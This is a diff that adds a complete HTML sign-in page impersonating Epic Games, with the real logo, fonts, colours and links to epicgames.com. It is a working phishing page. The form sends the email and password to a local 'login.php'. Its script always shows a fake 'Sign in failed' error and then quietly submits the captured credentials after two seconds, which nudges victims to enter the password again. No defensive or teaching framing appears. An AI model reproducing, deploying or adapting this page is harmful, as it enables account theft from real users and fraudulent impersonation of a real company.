@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, viewport-fit=cover">
+    <meta name="theme-color" content="#101014">
+    <link rel="shortcut icon" href="epic-favicon-96x96.png">
+    <link rel="apple-touch-icon" href="epic_logo.png">
+    <title>Epic Games</title>
+    <style>
+        :root {
+            --bg: #101014;
+            --surface: #1a1a1f;
+            --text: #fff;
+            --text-secondary: #999;
+            --accent: #0078f2;
+            --border: #2a2a2f;
+            --error: #ff4d4d;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        @font-face {
+            font-family: 'Inter';
+            src: url('https://static-assets-prod.unrealengine.com/account-portal/static/assets/Inter-Regular-CKDp9E3C.woff2') format('woff2');
+            font-weight: 400;
+        }
+        @font-face {
+            font-family: 'Inter';
+            src: url('https://static-assets-prod.unrealengine.com/account-portal/static/assets/Inter-Medium-P1cOs5ep.woff2') format('woff2');
+            font-weight: 500;
+        }
+        @font-face {
+            font-family: 'Inter';
+            src: url('https://static-assets-prod.unrealengine.com/account-portal/static/assets/Inter-Bold-CuhepTt8.woff2') format('woff2');
+            font-weight: 700;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            -webkit-font-smoothing: antialiased;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 24px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .logo img {
+            height: 32px;
+        }
+        h1 {
+            font-size: 20px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text);
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .form-group input:focus {
+            border-color: var(--accent);
+        }
+        .form-group input.error {
+            border-color: var(--error);
+        }
+        .error-msg {
+            color: var(--error);
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
+        }
+        .error-msg.show {
+            display: block;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 8px;
+        }
+        .btn-primary {
+            background: var(--accent);
+            color: #fff;
+        }
+        .btn-primary:hover {
+            background: #1a84ff;
+        }
+        .btn-secondary {
+            background: var(--surface);
+            color: var(--text);
+            border: 1px solid var(--border);
+        }
+        .btn-secondary:hover {
+            background: #252530;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: var(--text-secondary);
+            font-size: 13px;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border);
+        }
+        .divider::before {
+            margin-right: 16px;
+        }
+        .divider::after {
+            margin-left: 16px;
+        }
+        .links {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 13px;
+        }
+        .links a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .links span {
+            color: var(--text-secondary);
+            margin: 0 8px;
+        }
+        .footer-text {
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 11px;
+            margin-top: 40px;
+            line-height: 1.6;
+        }
+        .footer-text a {
+            color: var(--text-secondary);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="epic_logo.png" alt="Epic Games">
+        </div>
+        <h1>Sign In</h1>
+        <p class="subtitle">Sign in to your Epic Games account</p>
+
+        <form id="loginForm" action="login.php" method="POST">
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="username" placeholder="Enter your email" required autocomplete="email">
+                <p class="error-msg" id="emailError">Please enter a valid email address.</p>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+                <p class="error-msg" id="passwordError">Please enter your password.</p>
+            </div>
+            <p class="error-msg" id="generalError" style="text-align:center;">Sign in failed. Please check your credentials and try again.</p>
+            <button type="submit" class="btn btn-primary">Sign In</button>
+        </form>
+
+        <div class="divider">or</div>
+
+        <button class="btn btn-secondary" onclick="window.open('https://www.epicgames.com/id/register','_blank')">Create an Account</button>
+
+        <div class="links">
+            <a href="https://www.epicgames.com/id/register" target="_blank">Create Account</a>
+            <span>|</span>
+            <a href="https://www.epicgames.com/help" target="_blank">Help</a>
+        </div>
+
+        <p class="footer-text">
+            © 2026, Epic Games, Inc. All rights reserved.<br>
+            By signing in you agree to our <a href="https://www.epicgames.com/site/tos" target="_blank">Terms of Service</a> and <a href="https://www.epicgames.com/site/privacypolicy" target="_blank">Privacy Policy</a>.
+        </p>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            var email = document.getElementById('email').value.trim();
+            var password = document.getElementById('password').value.trim();
+            var emailError = document.getElementById('emailError');
+            var passwordError = document.getElementById('passwordError');
+            var generalError = document.getElementById('generalError');
+
+            emailError.classList.remove('show');
+            passwordError.classList.remove('show');
+            generalError.classList.remove('show');
+            document.getElementById('email').classList.remove('error');
+            document.getElementById('password').classList.remove('error');
+
+            var valid = true;
+
+            if (!email || !email.includes('@') || !email.includes('.')) {
+                emailError.classList.add('show');
+                document.getElementById('email').classList.add('error');
+                valid = false;
+            }
+            if (!password) {
+                passwordError.classList.add('show');
+                document.getElementById('password').classList.add('error');
+                valid = false;
+            }
+
+            if (!valid) {
+                e.preventDefault();
+                return;
+            }
+
+            generalError.classList.add('show');
+            document.getElementById('email').classList.add('error');
+            document.getElementById('password').classList.add('error');
+
+            e.preventDefault();
+
+            setTimeout(function() {
+                generalError.classList.remove('show');
+                document.getElementById('email').classList.remove('error');
+                document.getElementById('password').classList.remove('error');
+                document.getElementById('loginForm').submit();
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
